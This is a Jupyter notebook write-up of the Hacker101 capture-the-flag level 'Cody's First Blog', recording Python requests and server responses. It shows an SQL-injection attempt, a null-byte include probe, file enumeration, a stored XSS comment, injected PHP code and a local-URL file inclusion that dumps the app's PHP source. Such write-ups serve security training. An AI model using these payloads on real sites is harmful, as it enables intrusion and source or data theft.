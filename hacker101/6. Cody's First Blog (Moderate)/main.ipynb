{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Cody's First Blog - Captured flags 3/3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests, time\n",
    "\n",
    "url = \"https://d6d59725706baeb2b2069163e9a33be0.ctf.hacker101.com/\" # Home page\n",
    "\n",
    "session = requests.Session()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 1° Flag captured"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "I start from fetching the homepage"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = session.get(url)\n",
    "print(response.text)\n",
    "print(response.cookies)\n",
    "print(response.headers)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Response:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "\t<head>\n",
    "\t\t<title>Home -- Cody's First Blog</title>\n",
    "\t</head>\n",
    "\t<body>\n",
    "\t\t<h1>Home</h1>\n",
    "\t\t<p>Welcome to my blog!  I'm excited to share my thoughts with the world.  I have many important and controversial positions, which I hope to get across here.</p>\n",
    "\n",
    "\t<h2>September 1, 2018 -- First</h2>\n",
    "\t<p>First post!  I built this blog engine around one basic concept: PHP doesn't need a template language because it <i>is</i> a template language.  This server can't talk to the outside world and nobody but me can upload files, so there's no risk in just using include().</p>\n",
    "<p>Stick around for a while and comment as much as you want; all thoughts are welcome!</p>\n",
    "\n",
    "\n",
    "\t\t<br>\n",
    "\t\t<br>\n",
    "\t\t<hr>\n",
    "\t\t<h3>Comments</h3>\n",
    "\t\t<!--<a href=\"?page=admin.auth.inc\">Admin login</a>-->\n",
    "\t\t<h4>Add comment:</h4>\n",
    "\t\t<form method=\"POST\">\n",
    "\t\t\t<textarea rows=\"4\" cols=\"60\" name=\"body\"></textarea><br>\n",
    "\t\t\t<input type=\"submit\" value=\"Submit\">\n",
    "\t\t</form>\n",
    "\t</body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "Cookies: ```[]```\n",
    "Headers: ```{'Date': 'Tue, 11 Feb 2025 11:30:23 GMT', 'Content-Type': 'text/html', 'Content-Length': '586', 'Connection': 'keep-alive', 'Server': 'openresty/1.27.1.1', 'X-Powered-By': 'PHP/5.5.9-1ubuntu4.24', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip'}```\n",
    "\n",
    "The homepage contains the comment: ```<!--<a href=\"?page=admin.auth.inc\">Admin login</a>-->```. I try to access it."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = session.get(url+\"?page=admin.auth.inc\")\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Response:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "\t<head>\n",
    "\t\t<title>Admin Login -- Cody's First Blog</title>\n",
    "\t</head>\n",
    "\t<body>\n",
    "\t\t<h1>Admin Login</h1>\n",
    "\t\t<form method=\"POST\">\n",
    "\tUsername: <input type=\"text\" name=\"username\"><br>\n",
    "\tPassword: <input type=\"password\" name=\"password\"><br>\n",
    "\t<input type=\"submit\" value=\"Log In\"><br>\n",
    "\t</form>\n",
    "\t\t<br>\n",
    "\t\t<br>\n",
    "\t\t<hr>\n",
    "\t\t<h3>Comments</h3>\n",
    "\t\t<!--<a href=\"?page=admin.auth.inc\">Admin login</a>-->\n",
    "\t\t<h4>Add comment:</h4>\n",
    "\t\t<form method=\"POST\">\n",
    "\t\t\t<textarea rows=\"4\" cols=\"60\" name=\"body\"></textarea><br>\n",
    "\t\t\t<input type=\"submit\" value=\"Submit\">\n",
    "\t\t</form>\n",
    "\t</body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "I try to perform **SQL Injection**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = session.post(url+\"?page=admin.auth.inc\", data={\"username\":\"' or 1=1;--\", \"password\":\"' or 1=1;--\"}, headers={\"Content-Type\": \"application/x-www-form-urlencoded\", 'User-Agent': 'Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.109 Safari/537.36 CrKey/1.54.248666'})\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Response:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "\t<head>\n",
    "\t\t<title>Admin Login -- Cody's First Blog</title>\n",
    "\t</head>\n",
    "\t<body>\n",
    "\t\t<h1>Admin Login</h1>\n",
    "\t\t<form method=\"POST\">\n",
    "\tUsername: <input type=\"text\" name=\"username\"><br>\n",
    "\tPassword: <input type=\"password\" name=\"password\"><br>\n",
    "\t<input type=\"submit\" value=\"Log In\"><br>\n",
    "\t<span style=\"color: red;\">Incorrect username or password</span></form>\n",
    "\t\t<br>\n",
    "\t\t<br>\n",
    "\t\t<hr>\n",
    "\t\t<h3>Comments</h3>\n",
    "\t\t<!--<a href=\"?page=admin.auth.inc\">Admin login</a>-->\n",
    "\t\t<h4>Add comment:</h4>\n",
    "\t\t<form method=\"POST\">\n",
    "\t\t\t<textarea rows=\"4\" cols=\"60\" name=\"body\"></textarea><br>\n",
    "\t\t\t<input type=\"submit\" value=\"Submit\">\n",
    "\t\t</form>\n",
    "\t</body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "It seems to not work. Now, I try to request any other page"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = session.get(url+\"?page=main.py\")\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Response:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "\t<head>\n",
    "\t\t<title><br />\n",
    "<b>Notice</b>:  Undefined variable: title in <b>/app/index.php</b> on line <b>27</b><br />\n",
    " -- Cody's First Blog</title>\n",
    "\t</head>\n",
    "\t<body>\n",
    "\t\t<h1><br />\n",
    "<b>Notice</b>:  Undefined variable: title in <b>/app/index.php</b> on line <b>30</b><br />\n",
    "</h1>\n",
    "\t\t<br />\n",
    "<b>Warning</b>:  include(main.py.php): failed to open stream: No such file or directory in <b>/app/index.php</b> on line <b>21</b><br />\n",
    "<br />\n",
    "<b>Warning</b>:  include(): Failed opening 'main.py.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in <b>/app/index.php</b> on line <b>21</b><br />\n",
    "\t\t<br>\n",
    "\t\t<br>\n",
    "\t\t<hr>\n",
    "\t\t<h3>Comments</h3>\n",
    "\t\t<!--<a href=\"?page=admin.auth.inc\">Admin login</a>-->\n",
    "\t\t<h4>Add comment:</h4>\n",
    "\t\t<form method=\"POST\">\n",
    "\t\t\t<textarea rows=\"4\" cols=\"60\" name=\"body\"></textarea><br>\n",
    "\t\t\t<input type=\"submit\" value=\"Submit\">\n",
    "\t\t</form>\n",
    "\t</body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "Interesting! It is trying to include the file ```main.py.php``` into the homepage of the website... I may be able to include interesting things... Moreover, I obtain a clue from the web site. In fact, the working directory is the /app..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = session.get(url+\"?page=main.py\\x00\")\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Response:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "\t<head>\n",
    "\t\t<title><br />\n",
    "<b>Notice</b>:  Undefined variable: title in <b>/app/index.php</b> on line <b>27</b><br />\n",
    " -- Cody's First Blog</title>\n",
    "\t</head>\n",
    "\t<body>\n",
    "\t\t<h1><br />\n",
    "<b>Notice</b>:  Undefined variable: title in <b>/app/index.php</b> on line <b>30</b><br />\n",
    "</h1>\n",
    "\t\t<br />\n",
    "<b>Warning</b>:  include(): Failed opening 'main.py' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in <b>/app/index.php</b> on line <b>21</b><br />\n",
    "\t\t<br>\n",
    "\t\t<br>\n",
    "\t\t<hr>\n",
    "\t\t<h3>Comments</h3>\n",
    "\t\t<!--<a href=\"?page=admin.auth.inc\">Admin login</a>-->\n",
    "\t\t<h4>Add comment:</h4>\n",
    "\t\t<form method=\"POST\">\n",
    "\t\t\t<textarea rows=\"4\" cols=\"60\" name=\"body\"></textarea><br>\n",
    "\t\t\t<input type=\"submit\" value=\"Submit\">\n",
    "\t\t</form>\n",
    "\t</body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "I tried to remove the '.php' part from the file's path... However, main.py does not exist..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Trying to request most common files\n",
    "\n",
    "with open(\"php_common_files.txt\") as f:\n",
    "\tfiles = f.readlines()\n",
    "    \n",
    "for i, file in enumerate(files):\n",
    "\n",
    "\tif i % 10 == 0:\n",
    "\t\tprint(f\"Progress: {i}/{len(files)}. File: {file}\")\n",
    "\n",
    "\tfile = file.strip()\n",
    "\tresponse = session.get(url+f\"{file}\")\n",
    "\n",
    "\tif \"Not Found\" not in response.text:\n",
    "\t\tprint(f\"Found: {file}\")\n",
    "\t\tprint(response.text)\n",
    "\t\n",
    "\ttime.sleep(0.4)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Output:\n",
    "```\n",
    "Found: home.inc.php\n",
    "<p>Welcome to my blog!  I'm excited to share my thoughts with the world.  I have many important and controversial positions, which I hope to get across here.</p>\n",
    "\n",
    "\t<h2>September 1, 2018 -- First</h2>\n",
    "\t<p>First post!  I built this blog engine around one basic concept: PHP doesn't need a template language because it <i>is</i> a template language.  This server can't talk to the outside world and nobody but me can upload files, so there's no risk in just using include().</p>\n",
    "<p>Stick around for a while and comment as much as you want; all thoughts are welcome!</p>\n",
    "\n",
    "Found: admin.inc.php\n",
    "<h2>Pending Comments</h2>\n",
    "<br />\n",
    "<b>Warning</b>:  mysql_query(): Access denied for user ''@'localhost' (using password: NO) in <b>/app/admin.inc.php</b> on line <b>5</b><br />\n",
    "<br />\n",
    "<b>Warning</b>:  mysql_query(): A link to the server could not be established in <b>/app/admin.inc.php</b> on line <b>5</b><br />\n",
    "<br />\n",
    "<b>Warning</b>:  mysql_fetch_assoc() expects parameter 1 to be resource, boolean given in <b>/app/admin.inc.php</b> on line <b>6</b><br />\n",
    "\n",
    "Found: index.php\n",
    "<!doctype html>\n",
    "<html>\n",
    "\t<head>\n",
    "\t\t<title>Home -- Cody's First Blog</title>\n",
    "\t</head>\n",
    "\t<body>\n",
    "\t\t<h1>Home</h1>\n",
    "\t\t<p>Welcome to my blog!  I'm excited to share my thoughts with the world.  I have many important and controversial positions, which I hope to get across here.</p>\n",
    "\n",
    "\t<h2>September 1, 2018 -- First</h2>\n",
    "\t<p>First post!  I built this blog engine around one basic concept: PHP doesn't need a template language because it <i>is</i> a template language.  This server can't talk to the outside world and nobody but me can upload files, so there's no risk in just using include().</p>\n",
    "<p>Stick around for a while and comment as much as you want; all thoughts are welcome!</p>\n",
    "\n",
    "\n",
    "\t\t<br>\n",
    "\t\t<br>\n",
    "\t\t<hr>\n",
    "\t\t<h3>Comments</h3>\n",
    "\t\t<!--<a href=\"?page=admin.auth.inc\">Admin login</a>-->\n",
    "\t\t<h4>Add comment:</h4>\n",
    "\t\t<form method=\"POST\">\n",
    "\t\t\t<textarea rows=\"4\" cols=\"60\" name=\"body\"></textarea><br>\n",
    "\t\t\t<input type=\"submit\" value=\"Submit\">\n",
    "\t\t</form>\n",
    "\t</body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "I want to try to add the admin.inc.php into the homepage of the website."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = session.get(url+\"?page=admin.inc\")\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Response:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "\t<head>\n",
    "\t\t<title>Admin -- Cody's First Blog</title>\n",
    "\t</head>\n",
    "\t<body>\n",
    "\t\t<h1>Admin</h1>\n",
    "\t\t<h2>Pending Comments</h2>\n",
    "\t\t<br>\n",
    "\t\t<br>\n",
    "\t\t<hr>\n",
    "\t\t<h3>Comments</h3>\n",
    "\t\t<!--<a href=\"?page=admin.auth.inc\">Admin login</a>-->\n",
    "\t\t<h4>Add comment:</h4>\n",
    "\t\t<form method=\"POST\">\n",
    "\t\t\t<textarea rows=\"4\" cols=\"60\" name=\"body\"></textarea><br>\n",
    "\t\t\t<input type=\"submit\" value=\"Submit\">\n",
    "\t\t</form>\n",
    "\t\t<hr>\n",
    "\t\t<p>Admin flag is ^FLAG^...$FLAG$</p>\n",
    "\t\t\t\t<hr>\n",
    "\t\t<p>a</p>\n",
    "\t\t\t\t<hr>\n",
    "\t\t<p><script>alert(1);</script></p>\n",
    "\t\t\t</body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "I have been able to submit a comment containing: ```<script>alert(1);</script>```. First flag found!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 2° Flag captured"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "I want to try to inject some php code."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = session.post(url+\"?page=admin.inc\", data={\"body\":\"<?php phpinfo(); ?>\"}, headers={\"Content-Type\": \"application/x-www-form-urlencoded\", 'User-Agent': 'Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.109 Safari/537.36 CrKey/1.54.248666'})\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Response:\n",
    "```html\n",
    "<p>^FLAG^...$FLAG$</p>\t<p>Comment submitted and awaiting approval!</p>\n",
    "\t<a href=\"javascript:window.history.back()\">Go back</a>\n",
    "```\n",
    "\n",
    "Another flag found!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 3° Flag captured"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = session.get(url+\"?page=admin.inc\")\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Response:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "\t<head>\n",
    "\t\t<title>Admin -- Cody's First Blog</title>\n",
    "\t</head>\n",
    "\t<body>\n",
    "\t\t<h1>Admin</h1>\n",
    "\t\t<h2>Pending Comments</h2>\n",
    "\t\t<br>\n",
    "\t\t<br>\n",
    "\t\t<hr>\n",
    "\t\t<h3>Comments</h3>\n",
    "\t\t<!--<a href=\"?page=admin.auth.inc\">Admin login</a>-->\n",
    "\t\t<h4>Add comment:</h4>\n",
    "\t\t<form method=\"POST\">\n",
    "\t\t\t<textarea rows=\"4\" cols=\"60\" name=\"body\"></textarea><br>\n",
    "\t\t\t<input type=\"submit\" value=\"Submit\">\n",
    "\t\t</form>\n",
    "\t\t<hr>\n",
    "\t\t<p>Admin flag is ^FLAG^...$FLAG$</p>\n",
    "\t\t\t\t<hr>\n",
    "\t\t<p>a</p>\n",
    "\t\t\t\t<hr>\n",
    "\t\t<p><script>alert(1);</script></p>\n",
    "\t\t\t\t<hr>\n",
    "\t\t<p><!--?php phpinfo(); ?--></p>\n",
    "\t\t\t</body>\n",
    "</html>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "I want to exploit the possibility of accessing the index page from the localhost address to show php code... I want to execute the php command that can be used to show source code of the page"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = session.post(url+\"\", data={\"body\":\"<?php highlight_file('index.php'); ?> \"}, headers={\"Content-Type\": \"application/x-www-form-urlencoded\", 'User-Agent': 'Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.109 Safari/537.36 CrKey/1.54.248666'})\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now, I have to approve it from the admin panel: ```admin.inc.php```\n",
    "Then, I should be able to read the source code of the index.php page!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = session.get(url+\"?page=http://localhost/index\")\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Response:\n",
    "```\n",
    "<!doctype html>\n",
    "<html>\n",
    "\t<head>\n",
    "\t\t<title><br />\n",
    "<b>Notice</b>:  Undefined variable: title in <b>/app/index.php</b> on line <b>27</b><br />\n",
    " -- Cody's First Blog</title>\n",
    "\t</head>\n",
    "\t<body>\n",
    "\t\t<h1><br />\n",
    "<b>Notice</b>:  Undefined variable: title in <b>/app/index.php</b> on line <b>30</b><br />\n",
    "</h1>\n",
    "\t\t<!doctype html>\n",
    "<html>\n",
    "\t<head>\n",
    "\t\t<title>Home -- Cody's First Blog</title>\n",
    "\t</head>\n",
    "\t<body>\n",
    "\t\t<h1>Home</h1>\n",
    "\t\t<p>Welcome to my blog!  I'm excited to share my thoughts with the world.  I have many important and controversial positions, which I hope to get across here.</p>\n",
    "\n",
    "\t<h2>September 1, 2018 -- First</h2>\n",
    "\t<p>First post!  I built this blog engine around one basic concept: PHP doesn't need a template language because it <i>is</i> a template language.  This server can't talk to the outside world and nobody but me can upload files, so there's no risk in just using include().</p>\n",
    "<p>Stick around for a while and comment as much as you want; all thoughts are welcome!</p>\n",
    "\n",
    "\n",
    "\t\t<br>\n",
    "\t\t<br>\n",
    "\t\t<hr>\n",
    "\t\t<h3>Comments</h3>\n",
    "\t\t<!--<a href=\"?page=admin.auth.inc\">Admin login</a>-->\n",
    "\t\t<h4>Add comment:</h4>\n",
    "\t\t<form method=\"POST\">\n",
    "\t\t\t<textarea rows=\"4\" cols=\"60\" name=\"body\"></textarea><br>\n",
    "\t\t\t<input type=\"submit\" value=\"Submit\">\n",
    "\t\t</form>\n",
    "\t\t<hr>\n",
    "\t\t<p><code><span style=\"color: #000000\">\n",
    "<span style=\"color: #0000BB\">&lt;?php<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: #FF8000\">//&nbsp;^FLAG^...$FLAG$<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000BB\">mysql_connect</span><span style=\"color: #007700\">(</span><span style=\"color: #DD0000\">\"localhost\"</span><span style=\"color: #007700\">,&nbsp;</span><span style=\"color: #DD0000\">\"root\"</span><span style=\"color: #007700\">,&nbsp;</span><span style=\"color: #DD0000\">\"\"</span><span style=\"color: #007700\">);<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000BB\">mysql_select_db</span><span style=\"color: #007700\">(</span><span style=\"color: #DD0000\">\"level4\"</span><span style=\"color: #007700\">);<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000BB\">$page&nbsp;</span><span style=\"color: #007700\">=&nbsp;isset(</span><span style=\"color: #0000BB\">$_GET</span><span style=\"color: #007700\">[</span><span style=\"color: #DD0000\">'page'</span><span style=\"color: #007700\">])&nbsp;?&nbsp;</span><span style=\"color: #0000BB\">$_GET</span><span style=\"color: #007700\">[</span><span style=\"color: #DD0000\">'page'</span><span style=\"color: #007700\">]&nbsp;:&nbsp;</span><span style=\"color: #DD0000\">'home.inc'</span><span style=\"color: #007700\">;<br />&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style=\"color: #0000BB\">strpos</span><span style=\"color: #007700\">(</span><span style=\"color: #0000BB\">$page</span><span style=\"color: #007700\">,&nbsp;</span><span style=\"color: #DD0000\">':'</span><span style=\"color: #007700\">)&nbsp;!==&nbsp;</span><span style=\"color: #0000BB\">false&nbsp;</span><span style=\"color: #007700\">&amp;&amp;&nbsp;</span><span style=\"color: #0000BB\">substr</span><span style=\"color: #007700\">(</span><span style=\"color: #0000BB\">$page</span><span style=\"color: #007700\">,&nbsp;</span><span style=\"color: #0000BB\">0</span><span style=\"color: #007700\">,&nbsp;</span><span style=\"color: #0000BB\">5</span><span style=\"color: #007700\">)&nbsp;!==&nbsp;</span><span style=\"color: #DD0000\">\"http:\"</span><span style=\"color: #007700\">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000BB\">$page&nbsp;</span><span style=\"color: #007700\">=&nbsp;</span><span style=\"color: #DD0000\">\"home.inc\"</span><span style=\"color: #007700\">;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;if(isset(</span><span style=\"color: #0000BB\">$_POST</span><span style=\"color: #007700\">[</span><span style=\"color: #DD0000\">'body'</span><span style=\"color: #007700\">]))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000BB\">mysql_query</span><span style=\"color: #007700\">(</span><span style=\"color: #DD0000\">\"INSERT&nbsp;INTO&nbsp;comments&nbsp;(page,&nbsp;body,&nbsp;approved)&nbsp;VALUES&nbsp;('\"&nbsp;</span><span style=\"color: #007700\">.&nbsp;</span><span style=\"color: #0000BB\">mysql_real_escape_string</span><span style=\"color: #007700\">(</span><span style=\"color: #0000BB\">$page</span><span style=\"color: #007700\">)&nbsp;.&nbsp;</span><span style=\"color: #DD0000\">\"',&nbsp;'\"&nbsp;</span><span style=\"color: #007700\">.&nbsp;</span><span style=\"color: #0000BB\">mysql_real_escape_string</span><span style=\"color: #007700\">(</span><span style=\"color: #0000BB\">$_POST</span><span style=\"color: #007700\">[</span><span style=\"color: #DD0000\">'body'</span><span style=\"color: #007700\">])&nbsp;.&nbsp;</span><span style=\"color: #DD0000\">\"',&nbsp;0)\"</span><span style=\"color: #007700\">);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style=\"color: #0000BB\">strpos</span><span style=\"color: #007700\">(</span><span style=\"color: #0000BB\">$_POST</span><span style=\"color: #007700\">[</span><span style=\"color: #DD0000\">'body'</span><span style=\"color: #007700\">],&nbsp;</span><span style=\"color: #DD0000\">'&lt;?php'</span><span style=\"color: #007700\">)&nbsp;!==&nbsp;</span><span style=\"color: #0000BB\">false</span><span style=\"color: #007700\">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style=\"color: #DD0000\">'&lt;p&gt;^FLAG^...$FLAG$&lt;/p&gt;'</span><span style=\"color: #007700\">;<br /></span><span style=\"color: #0000BB\">?&gt;<br /></span>&nbsp;&nbsp;&nbsp;&nbsp;&lt;p&gt;Comment&nbsp;submitted&nbsp;and&nbsp;awaiting&nbsp;approval!&lt;/p&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&lt;a&nbsp;href=\"javascript:window.history.back()\"&gt;Go&nbsp;back&lt;/a&gt;<br /><span style=\"color: #0000BB\">&lt;?php<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: #007700\">exit();<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000BB\">ob_start</span><span style=\"color: #007700\">();<br />&nbsp;&nbsp;&nbsp;&nbsp;include(</span><span style=\"color: #0000BB\">$page&nbsp;</span><span style=\"color: #007700\">.&nbsp;</span><span style=\"color: #DD0000\">\".php\"</span><span style=\"color: #007700\">);<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000BB\">$body&nbsp;</span><span style=\"color: #007700\">=&nbsp;</span><span style=\"color: #0000BB\">ob_get_clean</span><span style=\"color: #007700\">();<br /></span><span style=\"color: #0000BB\">?&gt;<br /></span>&lt;!doctype&nbsp;html&gt;<br />&lt;html&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&lt;head&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;title&gt;<span style=\"color: #0000BB\">&lt;?php&nbsp;</span><span style=\"color: #007700\">echo&nbsp;</span><span style=\"color: #0000BB\">$title</span><span style=\"color: #007700\">;&nbsp;</span><span style=\"color: #0000BB\">?&gt;</span>&nbsp;--&nbsp;Cody's&nbsp;First&nbsp;Blog&lt;/title&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&lt;/head&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&lt;body&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;h1&gt;<span style=\"color: #0000BB\">&lt;?php&nbsp;</span><span style=\"color: #007700\">echo&nbsp;</span><span style=\"color: #0000BB\">$title</span><span style=\"color: #007700\">;&nbsp;</span><span style=\"color: #0000BB\">?&gt;</span>&lt;/h1&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color: #0000BB\">&lt;?php&nbsp;</span><span style=\"color: #007700\">echo&nbsp;</span><span style=\"color: #0000BB\">$body</span><span style=\"color: #007700\">;&nbsp;</span><span style=\"color: #0000BB\">?&gt;<br /></span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;br&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;br&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;hr&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;h3&gt;Comments&lt;/h3&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;!--&lt;a&nbsp;href=\"?page=admin.auth.inc\"&gt;Admin&nbsp;login&lt;/a&gt;--&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;h4&gt;Add&nbsp;comment:&lt;/h4&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;form&nbsp;method=\"POST\"&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;textarea&nbsp;rows=\"4\"&nbsp;cols=\"60\"&nbsp;name=\"body\"&gt;&lt;/textarea&gt;&lt;br&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input&nbsp;type=\"submit\"&nbsp;value=\"Submit\"&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/form&gt;<br /><span style=\"color: #0000BB\">&lt;?php<br />&nbsp;&nbsp;&nbsp;&nbsp;$q&nbsp;</span><span style=\"color: #007700\">=&nbsp;</span><span style=\"color: #0000BB\">mysql_query</span><span style=\"color: #007700\">(</span><span style=\"color: #DD0000\">\"SELECT&nbsp;body&nbsp;FROM&nbsp;comments&nbsp;WHERE&nbsp;page='\"&nbsp;</span><span style=\"color: #007700\">.&nbsp;</span><span style=\"color: #0000BB\">mysql_real_escape_string</span><span style=\"color: #007700\">(</span><span style=\"color: #0000BB\">$page</span><span style=\"color: #007700\">)&nbsp;.&nbsp;</span><span style=\"color: #DD0000\">\"'&nbsp;AND&nbsp;approved=1\"</span><span style=\"color: #007700\">);<br />&nbsp;&nbsp;&nbsp;&nbsp;while(</span><span style=\"color: #0000BB\">$row&nbsp;</span><span style=\"color: #007700\">=&nbsp;</span><span style=\"color: #0000BB\">mysql_fetch_assoc</span><span style=\"color: #007700\">(</span><span style=\"color: #0000BB\">$q</span><span style=\"color: #007700\">))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000BB\">?&gt;<br /></span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;hr&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;p&gt;<span style=\"color: #0000BB\">&lt;?php&nbsp;</span><span style=\"color: #007700\">echo&nbsp;</span><span style=\"color: #0000BB\">$row</span><span style=\"color: #007700\">[</span><span style=\"color: #DD0000\">\"body\"</span><span style=\"color: #007700\">];&nbsp;</span><span style=\"color: #0000BB\">?&gt;</span>&lt;/p&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color: #0000BB\">&lt;?php<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: #007700\">}<br /></span><span style=\"color: #0000BB\">?&gt;<br /></span>&nbsp;&nbsp;&nbsp;&nbsp;&lt;/body&gt;<br />&lt;/html&gt;<br /></span>\n",
    "</code> </p>\n",
